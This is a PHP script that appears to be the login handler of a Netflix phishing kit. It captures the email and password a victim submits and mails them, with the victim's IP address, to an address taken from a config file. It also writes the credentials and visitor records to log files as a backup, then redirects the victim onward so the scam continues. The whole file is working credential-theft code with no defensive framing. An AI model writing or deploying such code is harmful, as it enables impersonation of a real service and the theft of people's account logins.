<?php
session_start();
require_once("../../inc/config.inc.php");
require_once("../../inc/function.inc.php");
$settings = parse_ini_file('../../.config');
$_SESSION['Email'] = $_POST['login_user'];
$_SESSION['Password'] = $_POST['login_pass'];
$ip = $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$subject = $_SESSION['subject'] = "$ip - NETFLIX Login ***" ;
$to = $settings['email'];

send($_SESSION,$to, $subject);
$_SESSION['logged_in'] = "true";
$logss = $_SESSION['info'] = $ip."|".$_POST['login_user']."|".$_POST['login_pass']."<br>";
$click = fopen("../../result/total_login.txt","a");
fwrite($click,"$ip"."\n");
fclose($click);
$click = fopen("../../result/log_visitor.txt","a");
$jam = date("h:i:sa");
fwrite($click,"[$ip] Login NETFLIX ID"."\n");
fclose($click);
@fclose(@fwrite(@fopen("../../result/login-info.txt", "a"),"Title: $subject\n".$message)); //If send mail not work still have backup
header("location: ../account");
?>
